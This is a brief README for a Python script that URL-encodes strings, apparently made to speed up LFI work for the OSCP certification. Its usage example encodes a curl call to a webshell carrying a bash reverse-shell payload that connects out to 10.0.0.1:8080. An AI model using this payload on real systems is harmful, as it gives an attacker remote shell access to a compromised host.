# URL-Encoder

Python script to URL encode a string/command.<br>
I made this to automate the process of encodng curl commands for LFI for the OSCP.<br>
Can either be used by specifying an argument, or will be prompted for user input if not specified.<br>

Ex: 
```
python3 url-encoder.py "curl http://root.me/webshell?cmd=bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
```

![alt text](image.png)
